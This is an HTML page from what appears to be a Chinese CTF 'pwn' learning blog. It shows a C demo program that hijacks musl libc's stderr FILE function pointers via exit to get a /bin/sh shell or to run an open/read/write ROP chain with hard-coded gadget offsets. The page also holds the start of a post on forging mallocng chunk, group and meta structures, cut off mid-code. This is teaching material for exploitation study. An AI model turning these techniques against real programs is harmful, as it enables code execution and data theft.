class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//MY_HOW2HEAP_MUSL_UTIL_H</span></span></span><br></pre></td></tr></table></figure>
<p>c文件<code>musl_FSOP.c</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;musl_util.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_shell 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> orw 2</span></span><br><span class="line"><span class="comment">// 重要！在这里修改利用模式</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mode orw</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* flag = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">char</span>* bin_sh = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">size_t</span> enough_space[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">size_t</span> fake_stack[<span class="number">0x40</span>];</span><br><span class="line"><span class="type">char</span> flag_content[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序用于演示musl libc的FSOP利用方式。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;测试环境：ubuntu 22.04，musl版本：1.2.2。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;与glibc相似，FSOP也是musl的一种重要的利用方式。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是musl libc中FILE结构体的定义：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/internal/stdio_impl.h, line 21)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned flags;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *rpos, *rend;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31mint (*close)(FILE *);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *wend, *wpos;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *mustbezero_1;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *wbase;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31msize_t (*read)(FILE *, unsigned char *, size_t);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31msize_t (*write)(FILE *, const unsigned char *, size_t);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31moff_t (*seek)(FILE *, off_t, int);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tsize_t buf_size;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFILE *prev, *next;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint fd;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint pipe_pid;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tlong lockcount;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint mode;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tvolatile int lock;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint lbf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tvoid *cookie;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\toff_t off;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tchar *getln_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tvoid *mustbezero_2;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *shend;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\toff_t shlim, shcnt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFILE *prev_locked, *next_locked;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tstruct __locale_struct *locale;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;用红色标出的4行表示4个函数指针，这是我们利用的关键。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;又注意到exit函数有调用链：exit-&gt;__stdio_exit-&gt;close_file。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/stdio/__stdio_exit.c, line 16)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;void __stdio_exit(void)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFILE *f;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tfor (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tclose_file(__stdin_used);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tclose_file(__stdout_used);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tclose_file(__stderr_used);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/stdio/__stdio_exit.c, line 8)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static void close_file(FILE *f)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (!f) return;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFFINALLOCK(f);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以看到3个标准IO的FILE结构体都可能会调用write和seek函数。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;如果能够修改这些函数指针的值，就能够执行任意代码。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此无论如何，首先要做的就是获取libc的基地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们就利用stderr标准错误FILE结构体的地址来获取。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> stderr_addr = (<span class="type">size_t</span>)<span class="built_in">stderr</span>;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;stderr的地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\n\033[0m&quot;</span>, stderr_addr);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;stderr在libc中的偏移量为0xAD080。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> libc_base = stderr_addr - <span class="number">0xAD080</span>;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;计算得到libc的基地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\n\n\033[0m&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mode == get_shell)&#123;</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;你选择了get shell模式。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;在get shell模式中，我们需要修改stderr的3处内容：\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;1. 开头，需修改为字符串\&quot;/bin/sh\&quot;。\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;2. wpos或wbase，使得这两个值不等即可。\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;3. write函数指针，修改为system的地址。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;需要注意调用write函数时，第一个参数是FILE结构体地址。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此需要在FILE开头写字符串，从而get shell。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> system_addr = (<span class="type">size_t</span>)system;</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;system的地址为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\n\033[0m&quot;</span>, system_addr);</span><br><span class="line">        <span class="built_in">strcpy</span>((<span class="type">char</span>*)stderr_addr, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;wbase = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;write = (<span class="type">size_t</span> (*)(FILE*, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">size_t</span>))system_addr;</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;调教完成的stderr：\n&quot;</span>);</span><br><span class="line">        print_binary((<span class="type">char</span>*)stderr_addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> _IO_FILE));</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;最后只需要调用exit函数即可。\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(mode == orw)&#123;</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;你选择了orw模式。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;orw的利用方式较get shell要复杂一些。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;但对于stderr而言还是只需要修改3个地方：\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;1. 偏移0x30处，修改为修改为新栈的地址。\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;2. wbase，偏移0x38，修改为第一个gadget的地址。\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;3. write函数指针，修改为栈迁移的gadget的地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;在偏移0x789F5处有这样一个gadget：\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;0x00000000000789f5 : mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;考虑到write函数调用的第一个参数为stderr地址，rdi=stderr地址。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;按照上面的方案修改stderr，可以完美实现栈迁移。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;准备伪造栈的地址为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p\n\033[0m&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> pivot_gadget = libc_base + <span class="number">0x789F5</span>;</span><br><span class="line">        <span class="type">size_t</span> pop_rdi = libc_base + <span class="number">0x152A1</span>;</span><br><span class="line">        <span class="type">size_t</span> pop_rsi = libc_base + <span class="number">0x1B0A1</span>;</span><br><span class="line">        <span class="type">size_t</span> pop_rdx = libc_base + <span class="number">0x2A50B</span>;</span><br><span class="line"></span><br><span class="line">        ((FILE*)stderr_addr)-&gt;mustbezero_1 = (<span class="type">unsigned</span> <span class="type">char</span>*)fake_stack;</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;wbase = (<span class="type">unsigned</span> <span class="type">char</span>*)pop_rdi;</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;write = (<span class="type">size_t</span> (*)(FILE*, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">size_t</span>))pivot_gadget;</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;调教完成的stderr：\n&quot;</span>);</span><br><span class="line">        print_binary((<span class="type">char</span>*)stderr_addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> _IO_FILE));</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;一些有用的gadget：\n&quot;</span>);</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;pop rdi ; ret : &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\033[0m&quot;</span>, pop_rdi);</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;pop rsi ; ret : &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\033[0m&quot;</span>, pop_rsi);</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;pop rdx ; ret : &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\033[0m&quot;</span>, pop_rdx);</span><br><span class="line"></span><br><span class="line">        fake_stack[<span class="number">0</span>] = (<span class="type">size_t</span>)flag;   <span class="comment">// open函数参数1</span></span><br><span class="line">        fake_stack[<span class="number">1</span>] = pop_rsi;</span><br><span class="line">        fake_stack[<span class="number">2</span>] = <span class="number">0</span>;              <span class="comment">// open函数参数2</span></span><br><span class="line">        fake_stack[<span class="number">3</span>] = (<span class="type">size_t</span>)open;   <span class="comment">// 调用open</span></span><br><span class="line">        fake_stack[<span class="number">4</span>] = pop_rdi;</span><br><span class="line">        fake_stack[<span class="number">5</span>] = <span class="number">3</span>;              <span class="comment">// read函数参数1</span></span><br><span class="line">        fake_stack[<span class="number">6</span>] = pop_rsi;</span><br><span class="line">        fake_stack[<span class="number">7</span>] = (<span class="type">size_t</span>) flag_content;  <span class="comment">// read函数参数2</span></span><br><span class="line">        fake_stack[<span class="number">8</span>] = (<span class="type">size_t</span>) pop_rdx;</span><br><span class="line">        fake_stack[<span class="number">9</span>] = <span class="number">0x20</span>;           <span class="comment">// read函数参数3</span></span><br><span class="line">        fake_stack[<span class="number">10</span>] = (<span class="type">size_t</span>)read;  <span class="comment">// 调用open</span></span><br><span class="line">        fake_stack[<span class="number">11</span>] = pop_rdi;</span><br><span class="line">        fake_stack[<span class="number">12</span>] = <span class="number">1</span>;             <span class="comment">// write函数参数1</span></span><br><span class="line">        fake_stack[<span class="number">13</span>] = pop_rsi;</span><br><span class="line">        fake_stack[<span class="number">14</span>] = (<span class="type">size_t</span>) flag_content;  <span class="comment">// write函数参数2</span></span><br><span class="line">        fake_stack[<span class="number">15</span>] = (<span class="type">size_t</span>) pop_rdx;</span><br><span class="line">        fake_stack[<span class="number">16</span>] = <span class="number">0x20</span>;          <span class="comment">// write函数参数3</span></span><br><span class="line">        fake_stack[<span class="number">17</span>] = (<span class="type">size_t</span>)write; <span class="comment">// 调用write</span></span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;新栈内容：\n&quot;</span>);</span><br><span class="line">        print_binary((<span class="type">char</span>*)fake_stack, <span class="number">20</span> * <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;最后只需要调用exit函数即可。\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然，在musl libc中FSOP的方法有很多，这里只是演示了其中一种。更多的利用方式还是需要通过多看多做来掌握。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-2/" class="post-title-link" itemprop="url">musl pwn 入门 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:40:46" itemprop="dateCreated datePublished" datetime="2023-02-28T22:40:46+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/musl-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">musl pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在上一篇文章中我们学习了musl libc中内存分配的相关知识，了解了重要的数据结构及函数内容。本文将在此基础上进一步分析musl pwn的利用方式。</p>
<p>musl libc利用的核心思想是向free中传入一个假的chunk指针。由于free函数会通过该chunk进行回溯，获取到其所在的<code>group</code>和<code>meta</code>，因此除了构造假chunk外，还需要构造假<code>group</code>和假<code>meta</code>。如果在假<code>meta</code>中合理构造<code>prev</code>和<code>next</code>指针，在<code>nontrivial_free</code>中调用<code>dequeue</code>函数就可以实现这两个地址互相写。</p>
<p>但在整个流程中，我们需要绕过很多检查，以及进入正确的分支。</p>
<p>在<code>free</code>中会调用<code>nontrivial_free</code>，<code>free</code>中调用的<code>get_meta</code>函数中有一些检查项：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(/src/<span class="built_in">malloc</span>/mallocng/meta.h, line <span class="number">129</span>)</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">	<span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> index = get_slot_index(p);</span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="type">const</span> <span 